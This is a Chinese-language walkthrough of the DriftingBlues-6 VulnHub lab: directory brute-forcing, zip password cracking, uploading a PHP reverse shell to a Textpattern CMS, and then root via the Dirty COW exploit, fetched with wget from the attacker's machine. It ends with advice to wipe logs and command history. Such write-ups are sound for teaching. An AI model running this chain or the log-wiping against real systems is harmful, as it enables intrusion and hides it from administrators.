# 前言

靶机：`DriftingBlues-6`，IP地址`192.168.1.63`，因为重装靶机后期为`192.168.1.64`

攻击：`kali`，IP地址`192.168.1.16`

都采用虚拟机，网卡为桥接模式

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\1.jpg)

# 信息收集

## 使用nmap扫描端口

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\2.jpg)



## 网站探测

访问80端口，并查看页面源代码，发现有些信息，图片为`db.png`，还有一段话

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\3.jpg)

下载图片，测试有无隐藏信息

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\4.jpg)

![4-1](D:\stu\vulnhub\DriftingBlues靶场\pic-6\4-1.jpg)

访问这一段话中的地址，发现这是一个虚拟靶场的集合，并无其他信息，可能是一个暗广

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\5.jpg)

那么根据图片链接地址，猜测可能是目录型网站

使用`gobuster、dirsearch、ffuf、dirb、dirbuster`等工具进行扫描目录

```shell
gobuster dir -u http://192.168.1.63 -w /usr/share/wordlists/dirb/big.txt -x php,zip,md,txt,html,jpg -b 404,403 -d
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\6.jpg)

访问`db`发现就是图片地址，访问`robots`和`robots.txt`，都是一样的内容，给了一个目录，还细心的提示，在目录爆破时别忘了加上`zip`后缀名

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\7.jpg)

先访问这个目录测试`/textpattern/textpattern`，发现是一个登录界面

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\8.jpg)

其上级目录`/textpattern`类似于一个博客

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\9.jpg)

使用`whatweb`进行指纹识别，确定了CMS为`textpattern`，以及脚本语言为`php`等

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\10.jpg)

使用`gobuster`再次进行扫描，这里换个字典，猜测可能是字典的原因，因为上面也加上了`zip`后缀，这里只对`zip`后缀进行爆破，一层目录开始，然后往下深入，为什么使用`gobuster`，因为这里确实会把后缀加上，可以直观的看到有无`zip`文件，并且速度很快。当然也可以使用`dirb`这个也是好用的

```shell
#使用gobuster
gobuster dir -u http://192.168.1.63 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x zip -b 404,403 -t 200 

#使用dirb，这里的顺序很重要
dirb http://192.168.1.63 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -X .zip 
```



![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\11.jpg)

使用浏览器访问后下载到`kali`，不过解压需要密码，可以使用`fcrackzip`或者使用`john`套件中的`zip2john`转换，然后使用`john`破解，最终解出密码，查看解压文件，发现是认证的身份信息

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\12.jpg)

登录成功后，随便点击功能测试，发现CMS的版本

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\13.jpg)

我这里不知道什么原因，在进行功能点测试时，一直在加载，很是缓慢，尝试重启靶机，无效，重装靶机

这时靶机`ip`改变为`192.168.1.64`

发现`files`可以上传文件，把`kali`中的`php`脚本上传

```shell
/usr/usr/share/webshells/php/php-reverse-shell.php
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\14.jpg)

只需要修改脚本中的一处或两处，`ip`为kali的地址

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\15.jpg)

> 上传后的脚本地址在`textpattern`目录下，这里因为之前扫描过，知道位置，只是没有把截图放上去，建议扫描的时候，可以先使用`dirsearch`或者`dirb`把目录先走一遍

在`kali`使用`nc`监听端口`1234`后，使用浏览器访问脚本地址

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\16.jpg)

反弹shell后，使用`dpkg`查看有无`python`可用

```shell
dpkg -l | grep python
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\17.jpg)

使用`python`获取交互式界面

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

# 靶机内信息收集

使用`find`寻找具有SUID文件和`capabilites`，并无可用信息

```shell
find / -perm -u=s -type f 2>/dev/null
find / -type f -executable 2>/dev/null | xargs getcap -r 2>/dev/null
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\18.jpg)

查看信息内核版本信息以及定时任务

```shell
uname -a
cat /etc/crontab
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\19.jpg)

查看网络状态信息

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\20.jpg)

使用`searchsploit`搜索内核漏洞，发现在脏牛漏洞的范围内，尝试使用脏牛进行提取

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\21.jpg)

测试发现`40839`可以利用，在`kali`中开启`python`一个简易的网站服务，然后靶机通过`wget`把文件下载到本地，注意，在靶机上进行编译处理

```shell
#kali
python3 -m http.server 8888

#靶机
wget http://192.168.1.16:8888/40839.c
gcc -pthread 40839.c -o exp -lcrypt   //这个用法在40839.c中有提示
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\22.jpg)

执行`exp`，设置密码，不过这里就会回弹失败，没有关系，通过浏览器重新访问监听获取shell

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\23.jpg)

再次获取shell，然后切换到脚本中提示的默认`firefart`

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\24.jpg)

![](D:\stu\vulnhub\DriftingBlues靶场\pic-6\25.jpg)



# 痕迹清理

这里就只说一下

首先把脚本删除掉，在`/tmp`中的C语言文件以及编译的`exp`

把网站中的反弹`php`脚本删除

把`/var/log`中的各种日志清理，涉及到`kali`中的地址，都可以清除，或使用`sed`针对清理

把命令历史记录清理

# 总结

1. 考察目录扫描以及压缩包的解密
2. 考察文件上传的反弹shell
3. 考察linux系统内科提取，这里是脏牛提取



































